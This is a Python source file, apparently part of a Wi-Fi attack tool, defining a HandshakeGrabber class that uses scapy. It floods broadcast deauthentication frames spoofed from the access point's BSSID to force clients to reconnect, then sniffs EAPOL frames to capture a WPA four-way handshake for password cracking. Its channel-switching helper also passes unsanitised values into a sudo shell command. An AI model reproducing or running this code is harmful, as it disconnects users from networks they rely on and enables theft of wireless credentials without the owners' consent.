from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.layers.eap import EAPOL

from other.Timer import *
from preSpy.Handshake import *


class HandshakeGrabber:
    def __init__(self, interface, sniffTimeOut = 30):
        self.interface = interface
        self.sniffTimeOut = sniffTimeOut
        self.PKT1 = None
        self.PKT2 = None
        self.handshake = None
        self.bssid = None

    def run(self, apChannel):
        try:
            deauthThread = threading.Thread(target=self.deAuthThread)
            deauthThread.start()
            self.switchChannel(apChannel)  # changes channel to the ap's channel
            sniff(iface=self.interface, stop_filter=self.packetHandler, timeout=self.sniffTimeOut)  # starts sniffing for the handshake
            if self.handshake == None or not self.handshake.isValid:
                return True
            return False
        except Exception as e:
            print(e)
            return True

    def deAuthThread(self):
        timer = Timer(self.sniffTimeOut)
        dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid, addr3=self.bssid)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
        #packet.show()
        timer.start()
        while not timer.isOver() and (self.handshake == None or self.handshake.isValid == False):
            try:
                sendp(packet, inter=0.1, iface=self.interface, verbose=False)#sends de-auth packet
            except Exception as e:
                print(e)

    def packetHandler(self, pkt):
        """
        handles the packets that were sniffed, the way this function works with the handshake class
        is that it supplies 2 packets to the handshake, the first one is a packet sent from the ap
        that was part of the 4 way handshake , and the second one is a response from the station that
        received it, when the handshake is inited it checks if the 2 packet had enough information and
        are valid and the program acts accordingly.
        :param pkt:
        :return:
        """
        if pkt.haslayer(Dot11):  # refers to 802.11 protocol - wireless lan protocol
            if EAPOL in pkt and pkt[EAPOL].type == 3:  # checks if is 4 way handshake packet
                # pkt.show()
                if self.PKT1 == None:
                    if pkt.addr2 == self.bssid:
                        self.PKT1 = pkt
                else:
                    if pkt.addr2 == self.PKT1.addr1:
                        self.PKT2 = pkt
                        self.handshake = Handshake(self.PKT1, self.PKT2)
                        if self.handshake.isValid:
                            return True
                        self.PKT1 = None
                        self.PKT2 = None
        return False
    def switchChannel(self, channel):
        os.system(f"sudo iwconfig {self.interface} channel {channel}")